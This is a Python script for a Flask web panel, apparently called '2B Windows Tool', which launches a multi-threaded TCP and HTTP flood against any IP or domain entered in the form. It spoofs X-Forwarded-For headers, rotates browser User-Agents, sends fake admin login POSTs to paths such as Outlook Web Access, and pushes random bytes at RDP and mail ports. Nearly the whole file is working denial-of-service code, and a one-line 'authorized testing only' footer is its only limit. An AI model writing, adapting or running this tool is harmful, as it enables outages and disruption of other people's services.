#!/usr/bin/env python3
import os
import sys
import socket
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string, request

app = Flask(__name__)

# Configuración global
VERSION = "2B Windows v1.4"
DEFAULT_THREADS = 300  # Reducido para mejor rendimiento en Windows
DEFAULT_DURATION = 60  # segundos

# User-Agents realistas (actualizados para clientes Windows)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# Puertos comunes en entornos Windows
WINDOWS_PORTS = [80, 443, 8080, 8000, 8888, 8443, 3389, 21, 25, 110]

class WindowsAttackController:
    def __init__(self):
        self.is_attacking = False
        self.active_threads = 0
        self.last_stats = {"requests": 0, "errors": 0}
        self.start_time = 0
        self.socket_timeout = 1.5  # Timeout reducido para Windows

    def generate_http_request(self, target, port):
        """Genera peticiones HTTP realistas para entornos Windows"""
        method = random.choice(["GET", "POST", "HEAD"])
        path = random.choice([
            "/", "/index.html", 
            "/api/v1/test", 
            "/admin/login.aspx",
            "/owa/auth/logon.aspx"
        ])
        host_header = target if ":" not in target else target.split(":")[0]
        
        headers = [
            f"User-Agent: {random.choice(USER_AGENTS)}",
            f"Host: {host_header}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            f"X-Forwarded-For: {'.'.join(str(random.randint(1, 255)) for _ in range(4))}"
        ]
        
        if method == "POST":
            headers.append("Content-Type: application/x-www-form-urlencoded")
            headers.append(f"Content-Length: {random.randint(10, 500)}")
            body = "username=admin&password=" + "a" * random.randint(10, 50)
            return f"{method} {path} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n" + body
        else:
            return f"{method} {path} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"

    def windows_safe_socket(self):
        """Crea sockets optimizados para Windows"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.socket_timeout)
        return sock

    def tcp_flood(self, target, port, duration):
        """Ataque TCP flood adaptado para Windows"""
        end_time = time.time() + duration
        
        while self.is_attacking and time.time() < end_time:
            try:
                sock = self.windows_safe_socket()
                sock.connect((target, port))
                
                if port in [80, 443, 8080, 8000, 8888, 8443]:
                    request = self.generate_http_request(target, port)
                    sock.send(request.encode())
                else:
                    # Para RDP, SMTP, etc. usa conexiones más cortas
                    sock.send(os.urandom(random.randint(32, 256)))
                
                self.last_stats["requests"] += 1
                time.sleep(random.uniform(0.05, 0.3))  # Delay ajustado para Windows
                sock.close()
                
            except Exception as e:
                self.last_stats["errors"] += 1
                if 'sock' in locals():
                    sock.close()
                time.sleep(random.uniform(0.2, 0.8))  # Mayor tolerancia a errores
        
        self.active_threads -= 1

    def start_attack(self, target, port, threads, duration):
        """Inicia el ataque con ajustes para Windows"""
        if ":" in target:
            target, port = target.split(":")
            port = int(port)
        
        self.is_attacking = True
        self.active_threads = threads
        self.last_stats = {"requests": 0, "errors": 0}
        self.start_time = time.time()
        
        print(f"\n[2B Windows] Target: {target}:{port}")
        print(f"[2B Windows] Threads: {threads} | Duration: {duration}s")
        print("[2B Windows] Press Ctrl+C in web interface to stop\n")
        
        with ThreadPoolExecutor(max_workers=min(threads, 500)) as executor:  # Limitado para Windows
            for _ in range(threads):
                executor.submit(self.tcp_flood, target, port, duration)
        
        while self.active_threads > 0:
            time.sleep(1)
        
        self.is_attacking = False
        return True

controller = WindowsAttackController()

# HTML Template optimizado para Windows
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>2B Windows Tool</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1e1e1e;
            color: #d4d4d4;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            border: 1px solid #3e3e3e;
            padding: 20px;
            border-radius: 4px;
            background-color: #252526;
        }
        h1 {
            color: #569cd6;
            text-align: center;
            border-bottom: 1px solid #3e3e3e;
            padding-bottom: 10px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #9cdcfe;
        }
        input, select {
            width: 100%;
            padding: 8px;
            background-color: #3e3e3e;
            border: 1px solid #2d2d2d;
            color: #d4d4d4;
            border-radius: 3px;
        }
        button {
            background-color: #007acc;
            color: white;
            border: none;
            padding: 10px 15px;
            cursor: pointer;
            border-radius: 3px;
            font-weight: bold;
            margin-right: 10px;
        }
        button:hover {
            background-color: #0062a3;
        }
        button[value="stop"] {
            background-color: #d16969;
        }
        .status {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #3e3e3e;
            border-radius: 4px;
            background-color: #2d2d2d;
        }
        .stats {
            margin-top: 10px;
            font-size: 14px;
            color: #b5cea8;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            text-align: center;
            color: #6a6a6a;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>2B Windows Tool</h1>
        <form method="POST">
            <div class="form-group">
                <label for="target">Target (IP/Domain):</label>
                <input type="text" id="target" name="target" required placeholder="example.com or 192.168.1.100">
            </div>
            
            <div class="form-group">
                <label for="port">Port (empty for auto):</label>
                <input type="number" id="port" name="port" placeholder="80">
            </div>
            
            <div class="form-group">
                <label for="threads">Threads (50-500 recommended):</label>
                <input type="number" id="threads" name="threads" value="{{ threads }}" min="50" max="500">
            </div>
            
            <div class="form-group">
                <label for="duration">Duration (seconds):</label>
                <input type="number" id="duration" name="duration" value="{{ duration }}" min="10" max="1800">
            </div>
            
            <button type="submit" name="action" value="start">Start Attack</button>
            {% if controller.is_attacking %}
                <button type="submit" name="action" value="stop">Stop</button>
            {% endif %}
        </form>
        
        <div class="status">
            <h3>System Status:</h3>
            {% if controller.is_attacking %}
                <p style="color: #f48771;">ATTACK IN PROGRESS</p>
                <div class="stats">
                    <p>Elapsed: {{ (current_time - controller.start_time)|round(1) }}s</p>
                    <p>Requests: {{ controller.last_stats['requests'] }}</p>
                    <p>Errors: {{ controller.last_stats['errors'] }}</p>
                    <p>Active threads: {{ controller.active_threads }}</p>
                </div>
            {% else %}
                <p style="color: #b5cea8;">READY</p>
                {% if controller.last_stats['requests'] > 0 %}
                    <div class="stats">
                        <p>Last attack stats:</p>
                        <p>Total requests: {{ controller.last_stats['requests'] }}</p>
                        <p>Total errors: {{ controller.last_stats['errors'] }}</p>
                    </div>
                {% endif %}
            {% endif %}
        </div>
        
        <div class="footer">
            <p>{{ version }} | For authorized security testing only</p>
        </div>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'start':
            target = request.form.get('target')
            port = request.form.get('port', '80')
            threads = int(request.form.get('threads', DEFAULT_THREADS))
            duration = int(request.form.get('duration', DEFAULT_DURATION))
            
            if not port:
                port = random.choice(WINDOWS_PORTS)
            else:
                port = int(port)
            
            attack_thread = threading.Thread(
                target=controller.start_attack,
                args=(target, port, threads, duration)
            )
            attack_thread.daemon = True
            attack_thread.start()
            
        elif action == 'stop':
            controller.is_attacking = False
    
    return render_template_string(
        HTML_TEMPLATE,
        controller=controller,
        threads=DEFAULT_THREADS,
        duration=DEFAULT_DURATION,
        version=VERSION,
        current_time=time.time()
    )

def run_flask():
    # Configuración optimizada para Windows
    app.run(
        host='127.0.0.1',
        port=5000,
        threaded=True,
        use_reloader=False
    )

if __name__ == '__main__':
    print(f"""
     _____       _____  
    |  __ \     |  __ \ 
    | |__) |   _| |__) |
    |  ___/ | | |  ___/ 
    | |   | |_| | |     
    |_|    \__, |_|     
            __/ |       
           |___/    {VERSION}
    
    Starting web interface at http://127.0.0.1:5000
    """)
    
    # Verificar si es Windows
    if os.name != 'nt':
        print("[!] Warning: This version is optimized for Windows systems")
    
    # Configuración de sockets para Windows
    if os.name == 'nt':
        # Aumentar límite de tiempo de espera de sockets en Windows
        socket.setdefaulttimeout(1.5)
    
    run_flask()